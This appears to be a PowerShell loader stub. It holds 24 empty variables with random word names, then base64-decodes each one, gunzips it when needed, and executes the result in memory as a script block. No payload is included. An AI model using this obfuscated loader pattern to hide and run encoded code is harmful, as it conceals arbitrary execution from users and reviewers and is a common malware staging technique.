#Requires -Version 2

$Cantilever = ""
$Gearwheels = ""
$Schedulers = ""
$Unpolluted = ""
$Dishearten = ""
$Adulterate = ""
$Countesses = ""
$Confounded = ""
$Toothbrush = ""
$Pedicuring = ""
$Calvinists = ""
$Phosphoric = ""
$Snapdragon = ""
$Evangeline = ""
$Attempting = ""
$Bluefishes = ""
$Overruling = ""
$Navigating = ""
$Disdainful = ""
$Corruptest = ""
$Foreseeing = ""
$Subsystems = ""
$Conspiracy = ""
$Creameries = ""

$Modules = @($Cantilever,$Gearwheels,$Schedulers,$Unpolluted,$Dishearten,$Adulterate,$Countesses,$Confounded,$Toothbrush,$Pedicuring,$Calvinists,$Phosphoric,$Snapdragon,$Evangeline,$Attempting,$Bluefishes,$Overruling,$Navigating,$Disdainful,$Corruptest,$Foreseeing,$Subsystems,$Conspiracy,$Creameries)
$Modules | ForEach-Object {
    $Decoded = [System.Convert]::FromBase64String($_)
    if ($_ -like "H4s*") {
        $Decoded = ConvertFrom-Gzip -Bytes $Decoded
    }
    else {
        $Decoded = [Text.Encoding]::UTF8.GetString($Decoded)
    }
    $ScriptBlock = $ExecutionContext.InvokeCommand.NewScriptBlock($Decoded)
    . $ScriptBlock
}
